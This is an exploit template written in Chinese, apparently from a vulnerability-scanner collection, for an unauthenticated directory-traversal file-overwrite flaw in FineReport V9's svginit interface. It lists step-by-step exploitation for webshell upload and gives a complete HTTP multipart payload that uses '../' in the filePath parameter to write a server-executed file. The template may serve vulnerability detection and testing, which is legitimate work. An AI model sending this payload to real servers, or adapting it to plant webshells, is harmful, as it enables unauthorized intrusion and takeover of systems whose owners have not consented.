---
id: FINEREPORT-V9-UPLOAD
title: 帆软FineReport V9 任意文件覆盖上传
product: finereport
vendor: 帆软软件
version_affected: "v9.0"
severity: CRITICAL
tags: [rce, file_upload, path_traversal, 国产, 无需认证]
fingerprint: ["FineReport", "帆软", "ReportServer", "svginit"]
---

## 漏洞描述

帆软FineReport V9 的 svginit 接口存在目录穿越漏洞，可覆盖写入任意文件实现 webshell 上传。

## 影响版本

- v9.0

## 前置条件

- 无需登录认证
- 目标运行帆软FineReport V9，存在 `/WebReport/ReportServer` 接口

## 利用步骤

1. 访问目标 `/WebReport/ReportServer` 确认帆软报表服务存在
2. 构造包含 webshell 内容的 multipart 请求，通过 `op=svginit&cmd=design_save_svg` 接口上传
3. 在 `filePath` 参数中使用 `../` 目录穿越将文件写入 web 可访问目录
4. 访问写入的 webshell 路径确认执行成功

## Payload

```http
POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../bindshell.svg HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.svg"
Content-Type: image/svg+xml

<%out.print("vuln_test");%>
------WebKitFormBoundary--
```

通过目录穿越覆盖写入 webshell 文件。

## 验证方法

访问写入路径确认 webshell 执行。
